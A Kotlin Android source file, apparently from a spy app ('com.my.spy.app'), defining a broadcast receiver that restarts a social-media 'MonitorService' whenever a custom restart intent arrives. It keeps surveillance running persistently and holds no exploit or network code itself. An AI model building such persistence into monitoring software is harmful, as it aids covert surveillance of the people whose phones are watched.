package com.my.spy.app.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.my.spy.app.services.social.MonitorService
import com.my.spy.app.utils.Consts.RESTART_MONITOR_RECEIVER
import com.pawegio.kandroid.IntentFor


class MonitorReceiver : BroadcastReceiver(){
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == RESTART_MONITOR_RECEIVER) context.startService(IntentFor<MonitorService>(context))
    }
}